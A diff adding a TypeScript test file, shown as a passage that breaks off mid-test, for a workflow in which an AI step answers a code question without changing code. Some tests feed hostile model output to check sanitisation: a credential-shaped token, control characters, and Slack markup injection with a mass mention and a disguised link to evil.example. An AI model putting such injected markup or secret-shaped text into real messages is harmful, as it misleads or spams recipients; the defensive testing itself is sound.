@@ -1,0 +1,703 @@
+// Plan 6 Task 6: a question that needs no code change ends Answered, never Failed. The answer is a model's words: bounded, redacted and plain text, shown as an answer and never run.
+// An Answered task opens no pull request and changes no code; its money is Understand's (the planning limit). Only people who can see the task or its session see the answer;
+// the milestone other places hear carries a fixed sentence, never the answer. The production flag (`rovaraCodeV2Live`) stays off: these tests turn it on.
+import { randomUUID } from "node:crypto";
+import { afterEach, beforeAll, describe, expect, it } from "vitest";
+import { AgentStore } from "../../packages/broker/src/agents/store.js";
+import { registerTaskEndHandler, type TaskEndEvent } from "../../packages/broker/src/agents/task-end.js";
+import { refreshSessionSummary } from "../../packages/broker/src/agent-sessions/summary.js";
+import { taskPageStage, taskPageStep, workflowEndOutcome, workflowTaskFinished } from "../../packages/broker/src/aws/developer-tasks.js";
+import { workflowMessage } from "../../packages/broker/src/developer/workflow-messages.js";
+import { CHANGE_ANYWAY_RULE, understandPrompt } from "../../packages/broker/src/rovara-code/understand.js";
+import { answeredMilestoneItems } from "../../packages/broker/src/rovara-code/answered.js";
+import { registerCodeMilestoneHandler } from "../../packages/broker/src/rovara-code/milestones.js";
+import { agentSessionKey, builtinSettingsKey, projectMemberKey } from "../../packages/contracts/src/org-scoped-keys.js";
+import {
+  ANSWERED_MESSAGE_HEADER, ANSWERED_MILESTONE_TEXT, CHANGE_ANYWAY_NOTE, CLOSED_AS_ANSWERED_REASON, NoChangeNeededSchema, answerSourceLine, answeredMessage,
+  type CodeMilestone, type IntentAssessment,
+} from "../../packages/contracts/src/rovara-code.js";
+import { UNDERSTAND_ARTIFACT_NAME } from "../../packages/contracts/src/index.js";
+import {
+  WORKFLOW_BLOCK_REASONS, WORKFLOW_NO_CODE_CHANGE_MESSAGE, WorkflowDecisionRequestSchema, WorkflowSnapshotSchema, answerWorkflowIntent, createWorkflowSnapshot, decideWorkflow, recordIntentAssessment, startWorkflowUnderstand, workflowAnswer,
+} from "../../packages/contracts/src/task-workflow.js";
+import { canonicalPlanJson, parsePlanDocument, planDocumentMarkdown, readCanonicalPlan } from "../../packages/contracts/src/workflow-plan-document.js";
+import { MAYA, OMAR, createDeveloperTaskBroker, seedMembership, type Developer } from "../support/developer-task-broker.js";
+import { fakeModelAccess } from "../support/fake-model-access.js";
+import { planAnswer, planDocument } from "../support/plan-documents.js";
+import { TEST_ORG } from "../support/orgs.js";
+import { INVESTIGATE_THEN_FIX } from "../support/chain-examples.js";
+import { ORG_A, PRIYA, decisionBy, setupWorld } from "../support/chain-run-world.js";
+import { loadSlackBroker } from "../support/slack-broker.js";
+
+const NOW = "2026-10-26T12:00:00.000Z";
+const LATER = "2026-10-26T12:30:00.000Z";
+const TASK_ID = "8b579b4b-eaa7-4bf2-87bc-6da86b97c9e6";
+const OWNER = "a".repeat(64);
+const PROXY_URL = "http://internal-proxy.example.test:4000";
+const PREPARED = { result: { preparedBase: [{ repositoryId: "demo", baseCommitSha: "e".repeat(40) }] } };
+const ARJUN: Developer = { developerId: "a1".repeat(32), name: "Arjun Rao", provider: "oidc", sessionId: "s-arjun" };
+const MAX: Developer = { developerId: "b2".repeat(32), name: "Max Weber", provider: "oidc", sessionId: "s-max" };
+const MIA: Developer = { developerId: "c3".repeat(32), name: "Mia Torres", provider: "oidc", sessionId: "s-mia" };
+
+beforeAll(loadSlackBroker);
+
+const answerAssessment = (extra: Partial<Extract<IntentAssessment, { kind: "answer" }>> = {}): Extract<IntentAssessment, { kind: "answer" }> => ({
+  kind: "answer", restatement: "What does the retry flag do?", answer: "It turns retries on, for the payment worker only.",
+  sources: [{ repository: "demo", path: "src/retry.ts", line: 4 }, { repository: "demo", path: "docs/flags.md" }], ...extra,
+});
+const ready = (): IntentAssessment => ({ kind: "ready", path: "QUICK", restatement: "Make the retry flag read the config file.", assumptions: [] });
+const created = (extra: Record<string, unknown> = {}) =>
+  createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW, definitionVersion: "1.1.0", understand: true, pathFrom: "understand", ...extra });
+const running = (extra: Record<string, unknown> = {}) => startWorkflowUnderstand(created(extra), NOW);
+const FROM = { id: "art-1", objectKey: "private/owner/ws/intent.json", createdAt: NOW };
+const answered = (assessment: unknown = answerAssessment(), over: Record<string, unknown> = {}) =>
+  answerWorkflowIntent(running(), { expectedRevision: running().revision, assessment, artifact: FROM, now: LATER, ...over });
+
+// ---- the workflow's move
+
+describe("answerWorkflowIntent: a question-only intent ends Answered", () => {
+  it("ends CLOSED/COMPLETE with the outcome ANSWERED, one revision on, keeping the answer on intent and as an answer artifact", () => {
+    const before = running();
+    const next = answered();
+    expect(next).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED", revision: before.revision + 1, updatedAt: LATER });
+    expect(workflowAnswer(next)).toEqual(answerAssessment());
+    expect(next.artifacts).toEqual([expect.objectContaining({ type: "answer", version: 1, id: FROM.id, objectKey: FROM.objectKey, producer: "agentx-worker-untrusted", sha256: expect.stringMatching(/^[a-f0-9]{64}$/) })]);
+    expect(before.state).toBe("RUNNING");
+    expect(WorkflowSnapshotSchema.safeParse(next).success).toBe(true);
+  });
+
+  it("is not a plan, a pull request or a decision: no candidate, no pull request, no decision, and the plan stage never ran", () => {
+    const next = answered();
+    expect(next.candidate).toBeUndefined();
+    expect(next.pullRequests ?? []).toEqual([]);
+    expect(next.decisions).toEqual([]);
+    expect(next.artifacts.map((artifact) => artifact.type)).toEqual(["answer"]);
+  });
+
+  it("keeps the answer's digest the same for the same words and different for other words", () => {
+    expect(answered().artifacts[0]!.sha256).toBe(answered().artifacts[0]!.sha256);
+    expect(answered(answerAssessment({ answer: "Something else." })).artifacts[0]!.sha256).not.toBe(answered().artifacts[0]!.sha256);
+    expect(answered(answerAssessment({ sources: [] })).artifacts[0]!.sha256).not.toBe(answered().artifacts[0]!.sha256);
+  });
+
+  it("answers only an Understand step that is running, at the revision that was read, on a 1.1.0 workflow, and only an answer", () => {
+    const current = running();
+    const attempt = (workflow: unknown, over: Record<string, unknown> = {}) =>
+      () => answerWorkflowIntent(workflow, { expectedRevision: (workflow as { revision: number }).revision, assessment: answerAssessment(), artifact: FROM, now: LATER, ...over });
+    expect(attempt(current)).not.toThrow();
+    expect(attempt(current, { expectedRevision: current.revision - 1 })).toThrow(/stale/);
+    expect(attempt(created())).toThrow(/not understanding/);
+    expect(attempt(WorkflowSnapshotSchema.parse({ ...current, state: "WAITING" }))).toThrow(/not understanding/);
+    expect(attempt(createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW }))).toThrow(/not understanding/);
+    expect(attempt(current, { assessment: ready() })).toThrow(/not an answer/);
+    expect(attempt(current, { assessment: { ...answerAssessment(), approve: true } })).toThrow(/not an answer/);
+    expect(attempt(current, { assessment: { ...answerAssessment(), answer: "" } })).toThrow(/not an answer/);
+  });
+
+  it("is the only way an answer is recorded: recordIntentAssessment refuses it", () => {
+    expect(() => recordIntentAssessment(running(), { expectedRevision: running().revision, assessment: answerAssessment(), now: NOW })).toThrow(/answerWorkflowIntent/);
+  });
+
+  it("redacts a credential, makes control characters spaces and keeps the answer's line breaks, again when it is kept", () => {
+    const token = `ghp_${"a1B2".repeat(9)}`;
+    const next = answered(answerAssessment({ answer: `Use ${token} for it.\u0007‮\nSecond line.`, sources: [{ repository: "demo", path: `src/${token}.ts` }], restatement: `About ${token}` }));
+    const text = JSON.stringify(next.intent);
+    expect(text).not.toContain(token);
+    expect(text).toContain("[REDACTED]");
+    expect(text).not.toMatch(/\\u0007|\\u202e/u);
+    expect(workflowAnswer(next)!.answer).toContain("\nSecond line.");
+  });
+
+  it("a version 1 workflow cannot hold the outcome or the artifact", () => {
+    const v1 = createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW });
+    expect(WorkflowSnapshotSchema.safeParse({ ...v1, stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED" }).success).toBe(false);
+    const art = { id: "a", type: "answer", version: 1, sha256: "a".repeat(64), producer: "x", objectKey: "k", createdAt: NOW };
+    expect(WorkflowSnapshotSchema.safeParse({ ...v1, artifacts: [art] }).success).toBe(false);
+    expect(WorkflowSnapshotSchema.safeParse({ ...answered(), artifacts: [art] }).success).toBe(true);
+  });
+
+  it("workflowAnswer reads an answer only from a workflow that ended ANSWERED", () => {
+    expect(workflowAnswer(answered())).toBeDefined();
+    expect(workflowAnswer(running())).toBeUndefined();
+    expect(workflowAnswer({ ...answered(), outcome: "CLOSED" })).toBeUndefined();
+  });
+});
+
+// ---- the message
+
+describe("the answer's message", () => {
+  it("starts with the exact line, then the answer, then its sources as repository/path:line", () => {
+    const text = answeredMessage(answerAssessment());
+    expect(ANSWERED_MESSAGE_HEADER).toBe("No code change is needed. Here's the answer:");
+    expect(text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
+    expect(text.split("\n")[1]).toBe("It turns retries on, for the payment worker only.");
+    expect(text).toContain("- demo/src/retry.ts:4");
+    expect(text).toContain("- demo/docs/flags.md");
+    expect(text).not.toContain("flags.md:");
+  });
+
+  it("makes a source one plain line and never lets a model's words add markup to it", () => {
+    const line = answerSourceLine({ repository: "de<mo>", path: "src/a\nb```c.ts", line: 3 });
+    expect(line).not.toMatch(/[<>\n]/u);
+    expect(line).not.toContain("```");
+    expect(line.endsWith(":3")).toBe(true);
+  });
+
+  it("is plain text: control characters become spaces, a long run of line breaks is two, at most 10 sources, and the answer is cut at its limit", () => {
+    const sources = Array.from({ length: 12 }, (_, index) => ({ repository: "demo", path: `f${String(index)}.ts` }));
+    const text = answeredMessage({ answer: `a\u0007b\n\n\n\n\nc${"x".repeat(5000)}`, sources });
+    expect(text).not.toMatch(/\u0007/u);
+    expect(text).not.toMatch(/\n{3,}/u);
+    expect(text.split("\n").filter((line) => line.startsWith("- ")).length).toBe(10);
+    expect(text.length).toBeLessThan(4300);
+  });
+
+  it("is escaped for Slack as every model-written line is, and reads the same on the task's closing post", () => {
+    const next = answered(answerAssessment({ answer: "Use <!channel> & <https://evil.example|click>" }));
+    const text = workflowMessage({ taskId: TASK_ID, workflow: next })?.text ?? "";
+    expect(text.split("\n")[0]).toBe("No code change is needed. Here&#39;s the answer:".replace("&#39;", "'"));
+    expect(text).toContain("&lt;!channel&gt; &amp; &lt;https://evil.example|click&gt;");
+    expect(text).not.toMatch(/<(?!\/?$)/u);
+    expect(text).toContain("demo/src/retry.ts:4");
+  });
+
+  it("a task that ended Answered but whose answer can't be read still says no change is needed", () => {
+    const { intent: _intent, ...bare } = answered();
+    void _intent;
+    expect(workflowMessage({ taskId: TASK_ID, workflow: bare as never })?.text).toBe("No code change is needed.");
+  });
+
+  it("is not what a rejected plan, a timed-out Understand or an ordinary close says", () => {
+    const rejected = WorkflowSnapshotSchema.parse({ ...answered(), outcome: "REJECTED", artifacts: [] });
+    expect(workflowMessage({ taskId: TASK_ID, workflow: rejected })?.text).toBe("Closed without changes.");
+  });
+});
+
+// ---- where an Answered task reads
+
+describe("how an Answered task reads everywhere else", () => {
+  it("is a finished task whose end handlers hear `answered`, never `closed` and never `failed`", () => {
+    const task = { workflow: answered() };
+    expect(workflowTaskFinished(task)).toBe(true);
+    expect(workflowEndOutcome(task)).toBe("answered");
+    expect(workflowEndOutcome({ workflow: WorkflowSnapshotSchema.parse({ ...answered(), outcome: "REJECTED", artifacts: [] }) })).toBe("closed");
+    expect(workflowEndOutcome({ workflow: WorkflowSnapshotSchema.parse({ ...answered(), outcome: "CLOSED", artifacts: [] }) })).toBe("closed");
+  });
+
+  it("reads \"Answered\" on the page's strip and in its status, also after the owner closed it", () => {
+    expect(taskPageStep(answered(), false)).toBe("Answered");
+    expect(taskPageStep(answered(), true)).toBe("Answered");
+    expect(taskPageStage(answered(), false, true)).toMatchObject({ status: "Answered" });
+    expect(taskPageStage(answered(), true, true)).toMatchObject({ status: "Answered" });
+    expect(taskPageStage(WorkflowSnapshotSchema.parse({ ...answered(), outcome: "REJECTED", artifacts: [] }), false, true)).toMatchObject({ status: "Closed" });
+  });
+
+  it("the `answered` milestone is one per task, carries a fixed sentence and never the answer, and is written only for a task that ended Answered", () => {
+    const task = { taskId: TASK_ID, orgId: TEST_ORG, sessionId: "ses_aaaaaaaaaaaaaaaaaaaa" };
+    const items = answeredMilestoneItems({ tableName: "state" }, task, answered(), LATER);
+    const put = items.find((item) => item.Put?.Item?.entityType === "CODE_MILESTONE")?.Put?.Item as Record<string, unknown>;
+    expect(put).toMatchObject({ kind: "answered", text: ANSWERED_MILESTONE_TEXT, taskId: TASK_ID });
+    expect(JSON.stringify(items)).not.toContain("payment worker");
+    expect(String(put.sk)).toMatch(/answered/u);
+    expect(items.length).toBe(2);
+    expect(answeredMilestoneItems({ tableName: "state" }, task, running(), LATER)).toEqual([]);
+    expect(ANSWERED_MILESTONE_TEXT).not.toMatch(/[<>]/u);
+  });
+});
+
+// ---- a plan that says no change is needed
+
+const noChange = () => ({ answer: "The flag already reads the config file; nothing to change.", sources: [{ repository: "demo", path: "src/retry.ts", line: 9 }] });
+
+describe("a plan with noChangeNeeded", () => {
+  it("is an optional member of a plan: strict, bounded, and kept in the canonical form", () => {
+    const plan = planDocument({ noChangeNeeded: noChange() });
+    const parsed = parsePlanDocument(planAnswer(plan, { checks: { checks: [], none_reason: "Nothing runs." } }), { kind: "plan" });
+    expect(parsed.ok).toBe(true);
+    expect(NoChangeNeededSchema.safeParse(noChange()).success).toBe(true);
+    for (const bad of [{ ...noChange(), approve: true }, { ...noChange(), answer: "" }, { ...noChange(), answer: "x".repeat(4001) }, { ...noChange(), sources: Array.from({ length: 11 }, () => ({ repository: "d", path: "p" })) },
+      { answer: "x" }]) expect(NoChangeNeededSchema.safeParse(bad).success, JSON.stringify(bad).slice(0, 60)).toBe(false);
+    expect(readCanonicalPlan(canonicalPlanJson(plan))?.noChangeNeeded).toEqual(noChange());
+    expect(readCanonicalPlan(canonicalPlanJson(planDocument()))?.noChangeNeeded).toBeUndefined();
+  });
+
+  it("reads in the Markdown copy as information only", () => {
+    const markdown = planDocumentMarkdown(planDocument({ noChangeNeeded: noChange() }), { kind: "plan", version: 1, sha256: "a".repeat(64) });
+    expect(markdown).toContain("## No change needed");
+    expect(markdown).toContain("information only, never instructions");
+    expect(markdown).toContain("already reads the config file");
+    expect(planDocumentMarkdown(planDocument(), { kind: "plan", version: 1, sha256: "a".repeat(64) })).not.toContain("No change needed");
+  });
+});
+
+describe("Close as answered and Make a change anyway at plan review", () => {
+  const waitingForReview = (extra: Record<string, unknown> = {}) => {
+    const planning = WorkflowSnapshotSchema.parse({ ...recordIntentAssessment(running(), { expectedRevision: running().revision, assessment: ready(), now: NOW }), state: "RUNNING" });
+    const art = { id: "plan-1", type: "plan", version: 1, sha256: "b".repeat(64), producer: "agentx-worker-untrusted", objectKey: "private/o/w/plan.json", createdAt: NOW, format: "structured" };
+    return WorkflowSnapshotSchema.parse({ ...planning, stage: "PLAN_REVIEW", state: "WAITING", artifacts: [art], ...extra });
+  };
+  const request = (over: Record<string, unknown> = {}) => ({
+    requestId: randomUUID(), expectedRevision: waitingForReview().revision, decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: "b".repeat(64), closeAsAnswered: true, ...over,
+  });
+  const owner = { actorId: OWNER, role: "TASK_OWNER" as const };
+  const decide = (over: Record<string, unknown> = {}, options: Record<string, unknown> = {}, workflow = waitingForReview()) =>
+    decideWorkflow(workflow, request(over), owner, { now: LATER, allowedSkipStages: [], noChangeNeeded: { ...noChange(), restatement: "Retry flag" }, ...options });
+
+  it("Close as answered ends the task ANSWERED with the plan's answer, recording a REJECT decision marked closedAs ANSWERED", () => {
+    const next = decide();
+    expect(next).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED", revision: waitingForReview().revision + 1 });
+    expect(next.decisions.at(-1)).toMatchObject({ decision: "REJECT", closedAs: "ANSWERED", reason: CLOSED_AS_ANSWERED_REASON, actorId: OWNER });
+    expect(workflowAnswer(next)).toMatchObject({ answer: noChange().answer, restatement: "Retry flag", sources: noChange().sources });
+    expect(next.artifacts.map((artifact) => artifact.type)).toEqual(["plan", "answer"]);
+    expect(next.artifacts.at(-1)).toMatchObject({ objectKey: "private/o/w/plan.json" });
+  });
+
+  it("needs a plan that says no change is needed, a 1.1.0 workflow, the owner and the current plan's digest", () => {
+    expect(() => decide({}, { noChangeNeeded: undefined })).toThrow(/does not say that no change is needed/);
+    expect(() => decide({ artifactDigest: "c".repeat(64) })).toThrow(/current plan digest/);
+    expect(() => decide({ expectedRevision: 1 })).toThrow(/stale/);
+    expect(() => decideWorkflow(waitingForReview(), request(), { actorId: "f".repeat(64), role: "TASK_OWNER" }, { now: LATER, allowedSkipStages: [], noChangeNeeded: { ...noChange(), restatement: "x" } })).toThrow(/task owner/);
+    expect(() => decide({}, {}, createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW }))).toThrow();
+  });
+
+  it("is only a way to close a plan: Approve, Request changes and Skip cannot carry it", () => {
+    for (const decision of ["APPROVE", "REQUEST_CHANGES", "SKIP"]) expect(WorkflowDecisionRequestSchema.safeParse(request({ decision })).success, decision).toBe(false);
+    expect(WorkflowDecisionRequestSchema.safeParse(request()).success).toBe(true);
+    expect(WorkflowDecisionRequestSchema.safeParse(request({ closeAsAnswered: false })).success).toBe(false);
+  });
+
+  it("a plain Reject of the same plan still ends REJECTED, with no answer", () => {
+    const next = decide({ closeAsAnswered: undefined, reason: "No." });
+    expect(next).toMatchObject({ stage: "CLOSED", outcome: "REJECTED" });
+    expect(next.decisions.at(-1)?.closedAs).toBeUndefined();
+    expect(workflowAnswer(next)).toBeUndefined();
+  });
+
+  it("a repeat of the same request changes nothing, and the same id used for a plain Reject is a different decision", () => {
+    const first = request();
+    const once = decideWorkflow(waitingForReview(), first, owner, { now: LATER, allowedSkipStages: [], noChangeNeeded: { ...noChange(), restatement: "x" } });
+    expect(decideWorkflow(once, first, owner, { now: LATER, allowedSkipStages: [] })).toEqual(once);
+    const { closeAsAnswered: _closeAsAnswered, ...plain } = first;
+    void _closeAsAnswered;
+    expect(() => decideWorkflow(once, plain, owner, { now: LATER, allowedSkipStages: [] })).toThrow(/different workflow decision/);
+  });
+
+  it("Make a change anyway is the ordinary Request changes with the note, sent back to the plan step", () => {
+    expect(CHANGE_ANYWAY_NOTE).toBe("Make the change anyway.");
+    const next = decideWorkflow(waitingForReview(), { requestId: randomUUID(), expectedRevision: waitingForReview().revision, decision: "REQUEST_CHANGES", reason: CHANGE_ANYWAY_NOTE, artifactDigest: "b".repeat(64) }, owner, { now: LATER, allowedSkipStages: [] });
+    expect(next).toMatchObject({ stage: "PLAN", state: "READY", outcome: "CHANGES_REQUESTED" });
+    expect(next.decisions.at(-1)).toMatchObject({ decision: "REQUEST_CHANGES", reason: "Make the change anyway." });
+  });
+
+  it("the plan-review card gives the answer and says what the owner can do, with the ordinary buttons", () => {
+    const structured = { claims: ["1. x"], claimCount: 1, decisionCount: 0, tiny: true, noChangeNeeded: { answer: "Use <!channel> here & there", sources: noChange().sources } };
+    const message = workflowMessage({ taskId: TASK_ID, workflow: waitingForReview(), structured, taskPageUrl: "https://example.test/review/t/task" })!;
+    expect(message.text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
+    expect(message.text).toContain("&lt;!channel&gt; here &amp; there");
+    expect(message.text).toContain("Close it as answered, or ask for the change anyway");
+    expect(message.text).not.toMatch(/<(?!\/?$)/u);
+  });
+});
+
+// ---- through the real broker
+
+async function world(options: { live?: boolean } = {}) {
+  const access = fakeModelAccess();
+  const h = await createDeveloperTaskBroker({ brokerExtra: { agents: { ...(options.live === false ? {} : { rovaraCodeV2Live: true }) }, modelAccess: { access, proxyUrl: PROXY_URL }, cloud: true } });
+  access.setMemberSpent(TEST_ORG, MAYA.developerId, 0);
+  access.setOrgSpent(TEST_ORG, 0);
+  const store = new AgentStore({ documentClient: h.db, tableName: "state", now: Date.now });
+  await store.ensureBuiltinSettings(TEST_ORG, "rovara-code");
+  h.db.set({ ...builtinSettingsKey(TEST_ORG, "rovara-code"), entityType: "BUILTIN_AGENT_SETTINGS", pinnedVersion: 2, updatedBy: "test", updatedAt: NOW });
+  const member = async (who: Developer, role: "viewer" | "developer" | undefined = "developer") => {
+    h.db.set({ pk: `SESSION#${who.sessionId}`, sk: "META", sessionId: who.sessionId, developerId: who.developerId, amr: who.provider, startedAt: new Date(Date.now() - 60_000).toISOString(), endsAt: Math.floor(Date.now() / 1000) + 604_800 });
+    h.db.set({ pk: `DEVELOPER#${who.developerId}`, sk: "META", developerId: who.developerId, provider: who.provider, displayName: who.name, firstSignInAt: "x", lastSignInAt: "x", revoked: false });
+    seedMembership(h.db, who.developerId, { orgId: TEST_ORG, role: "member" });
+    if (role !== undefined) h.db.set({ ...projectMemberKey(TEST_ORG, who.developerId, "payments"), entityType: "MEMBERSHIP", ownerKey: who.developerId, projectName: "payments", grantId: randomUUID(), role, projectRole: role === "viewer" ? "viewer" : "contributor" });
+  };
+  type Meta = Record<string, unknown> & {
+    workspaceId: string; sessionId: string; budgetUsd?: number; closedAt?: string; releasedAt?: string; requestText?: string; retryOfTaskId?: string; developerId: string; payer?: { kind: string; developerId?: string };
+    workflow: { revision: number; stage: string; state: string; path: string; outcome?: string; blockReason?: string; artifacts: Array<{ type: string; sha256: string; objectKey: string }>; decisions: Array<Record<string, unknown>>;
+      pullRequests?: unknown[]; candidate?: unknown; intent?: { assessment?: IntentAssessment; pathFrom: string } };
+  };
+  const meta = (taskId: string) => h.db.get(`DEVTASK#${taskId}`, "META") as Meta;
+  const operations = (workspaceId: string) => h.db.find((item) => item.pk === `WORKSPACE#${workspaceId}` && item.entityType === "OPERATION");
+  const operationOf = (workspaceId: string, mode: string) => operations(workspaceId).filter((item) => item.workflowMode === mode).at(-1);
+  const invocationOf = (operationId: string) => h.db.find((item) => item.entityType === "OUTBOX" && item.operationId === operationId)[0]!.invocation as { callbackCapability: string; payload: Record<string, unknown> & { prompt: string } };
+  const rows = () => h.db.find((item) => item.pk === "WORKFLOW_DISPATCH");
+  const refreshSummary = (sessionId: string) => refreshSessionSummary({ documentClient: h.db, tableName: "state", now: Date.now, log: () => undefined }, TEST_ORG, sessionId);
+  const start = async (body: Record<string, unknown> = {}, text = "What does the retry flag do?", who: Developer = MAYA) => {
+    const reply = await h.dev(who, "POST", "/v1/app/projects/payments/code", { requestId: randomUUID(), input: { text }, ...body });
+    expect(reply.status, JSON.stringify(reply.body)).toBe(202);
+    const taskId = (reply.body.task as { taskId: string }).taskId;
+    return { taskId, workspaceId: meta(taskId).workspaceId, sessionId: meta(taskId).sessionId };
+  };
+  const understanding = async (body: Record<string, unknown> = {}, text?: string, who: Developer = MAYA) => {
+    const run = await start(body, text, who);
+    await h.finish(run.workspaceId, String(operations(run.workspaceId).find((item) => item.kind === "prepare")!.id), "SUCCEEDED", PREPARED);
+    return { ...run, operationId: String(operationOf(run.workspaceId, "UNDERSTAND")!.id) };
+  };
+  const finishUnderstand = async (run: { workspaceId: string; operationId: string }, assessment: unknown) => {
+    await h.artifact(run.workspaceId, run.operationId, UNDERSTAND_ARTIFACT_NAME, JSON.stringify(assessment));
+    return h.finish(run.workspaceId, run.operationId, "SUCCEEDED", { result: { workflowMode: "UNDERSTAND" } });
+  };
+  /** A task whose Understand answered. */
+  const answeredTask = async (assessment: unknown = answerAssessment(), body: Record<string, unknown> = {}, text?: string) => {
+    const run = await understanding(body, text);
+    await finishUnderstand(run, assessment);
+    return run;
+  };
+  /** A task whose plan says no change is needed, waiting for its owner. */
+  const noChangePlan = async () => {
+    const run = await understanding();
+    await finishUnderstand(run, ready());
+    const plan = operationOf(run.workspaceId, "PLAN")!;
+    await h.artifact(run.workspaceId, String(plan.id), "plan.md", planAnswer(planDocument({ noChangeNeeded: noChange() }), { checks: { checks: [], none_reason: "Nothing runs." } }));
+    await h.finish(run.workspaceId, String(plan.id), "SUCCEEDED", { result: { workflowMode: "PLAN" } });
+    expect(meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
+    const document = meta(run.taskId).workflow.artifacts.at(-1)!;
+    return { ...run, digest: document.sha256 };
+  };
+  const decide = (who: Developer, taskId: string, body: Record<string, unknown>) =>
+    h.dev(who, "POST", `/v1/dev/tasks/${taskId}/workflow/decision`, { requestId: randomUUID(), expectedRevision: meta(taskId).workflow.revision, ...body });
+  const sessionRecord = (sessionId: string) => h.db.get(agentSessionKey(TEST_ORG, sessionId, "META")) as Record<string, unknown> & { summary: { status: string; step?: string } };
+  const events = (sessionId: string) => h.db.find((item) => item.pk === agentSessionKey(TEST_ORG, sessionId, "META").pk && String(item.sk).startsWith("EVENT#")).map((item) => String(item.text));
+  const milestones = (taskId: string) => h.db.find((item) => item.pk === `DEVTASK#${taskId}` && String(item.sk).startsWith("CODE_MILESTONE#answered"));
+  const share = (sessionId: string, who: Developer, level: "view" | "use" | "edit") =>
+    h.dev(MAYA, "PUT", `/v1/app/sessions/${sessionId}/shares`, { requestId: randomUUID(), principal: { kind: "member", developerId: who.developerId }, level });
+  const changeAnyway = (who: Developer, sessionId: string, body: Record<string, unknown> = {}) => h.dev(who, "POST", `/v1/app/sessions/${sessionId}/change-anyway`, { requestId: randomUUID(), ...body });
+  return { ...h, access, member, meta, operations, operationOf, invocationOf, rows, refreshSummary, start, understanding, finishUnderstand, answeredTask, noChangePlan, decide, sessionRecord, events, milestones, share, changeAnyway };
+}
+
+const ended: TaskEndEvent[] = [];
+const heard: CodeMilestone[] = [];
+const offs: Array<() => void> = [];
+afterEach(() => { for (const off of offs.splice(0)) off(); ended.length = 0; heard.length = 0; });
+const listen = () => {
+  offs.push(registerTaskEndHandler(async (_deps, event) => { ended.push(event); }));
+  offs.push(registerCodeMilestoneHandler({ name: "answered_test", on: async (_deps, milestone) => { heard.push(milestone); } }));
+};
+const errorOf = (reply: { body: Record<string, unknown> }) => reply.body.error as { code: string; message: string };
+
+describe("Understand answers a question: the task ends Answered", () => {
+  it("\"what does the retry flag do?\" ends CLOSED/COMPLETE/ANSWERED with the answer kept, no plan, no pull request, no code change, and the workspace given back", async () => {
+    listen();
+    const t = await world();
+    const run = await t.answeredTask();
+    const task = t.meta(run.taskId);
+    expect(task.workflow).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED", intent: { assessment: answerAssessment() } });
+    expect(task.workflow.artifacts.map((artifact) => artifact.type)).toEqual(["answer"]);
+    expect(task.workflow.pullRequests ?? []).toEqual([]);
+    expect(task.workflow.candidate).toBeUndefined();
+    expect(t.operationOf(run.workspaceId, "PLAN")).toBeUndefined();
+    expect(t.operations(run.workspaceId).map((item) => item.workflowMode).filter(Boolean)).toEqual(["UNDERSTAND"]);
+    expect(t.rows().filter((item) => item.kind !== "operation_end")).toEqual([]);
+    expect(task.releasedAt).toBeDefined();
+    expect(task.blockReason ?? task.workflow.blockReason).toBeUndefined();
+  });
+
+  it("tells the end handlers `answered` exactly once, never `failed` or `closed`, and tells the milestone handlers `answered` once with a fixed sentence", async () => {
+    listen();
+    const t = await world();
+    const run = await t.answeredTask();
+    expect(ended.filter((event) => event.taskId === run.taskId).map((event) => event.outcome)).toEqual(["answered"]);
+    expect(heard.filter((milestone) => milestone.taskId === run.taskId)).toEqual([expect.objectContaining({ kind: "answered", text: ANSWERED_MILESTONE_TEXT, sessionId: run.sessionId })]);
+    expect(JSON.stringify(heard)).not.toContain("payment worker");
+    expect(t.milestones(run.taskId)).toHaveLength(1);
+  });
+
+  it("its money is Understand's: one key was minted under the planning limit, which is unchanged, and nothing was spent after the answer", async () => {
+    const t = await world();
+    const run = await t.understanding();
+    expect(t.meta(run.taskId).budgetUsd).toBe(2);
+    await t.finishUnderstand(run, answerAssessment());
+    expect(t.meta(run.taskId).budgetUsd).toBe(2);
+    expect(t.access.mintKey.mock.calls.length).toBeLessThanOrEqual(1);
+    const minted = t.access.mintKey.mock.calls.length;
+    await t.handler({ source: "agentx.workflow-dispatch-recovery" });
+    expect(t.access.mintKey.mock.calls.length).toBe(minted);
+  });
+
+  it("is not in the run-cost history: an Answered run teaches the next estimate nothing", async () => {
+    const t = await world();
+    const run = await t.answeredTask();
+    expect(t.meta(run.taskId).runCostRecordedAt).toBeUndefined();
+    expect(t.db.find((item) => String(item.pk).includes("RUN_COST") || String(item.sk).includes("RUN_COST"))).toEqual([]);
+  });
+
+  it("the session reads Answered and succeeded, with the milestone's line on its timeline and not the answer", async () => {
+    const t = await world();
+    const run = await t.answeredTask();
+    await t.refreshSummary(run.sessionId);
+    expect(t.sessionRecord(run.sessionId).summary).toMatchObject({ status: "succeeded", step: "Answered" });
+    expect(t.events(run.sessionId)).toContain(ANSWERED_MILESTONE_TEXT);
+    expect(t.events(run.sessionId).join("\n")).not.toContain("payment worker");
+    const session = await t.dev(MAYA, "GET", `/v1/app/sessions/${run.sessionId}`);
+    expect(session.status).toBe(200);
+    expect(JSON.stringify(session.body)).toMatch(/Answered/u);
+  });
+
+  it("the thread post gives the answer after the exact first line, with its sources", async () => {
+    const t = await world();
+    const run = await t.answeredTask();
+    const message = workflowMessage({ taskId: run.taskId, workflow: t.meta(run.taskId).workflow as never })!;
+    expect(message.text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
+    expect(message.text).toContain("It turns retries on, for the payment worker only.");
+    expect(message.text).toContain("demo/src/retry.ts:4");
+  });
+
+  it("keeps a hostile answer plain: credentials redacted, markup inert, nothing run", async () => {
+    const t = await world();
+    const token = `ghp_${"a1B2".repeat(9)}`;
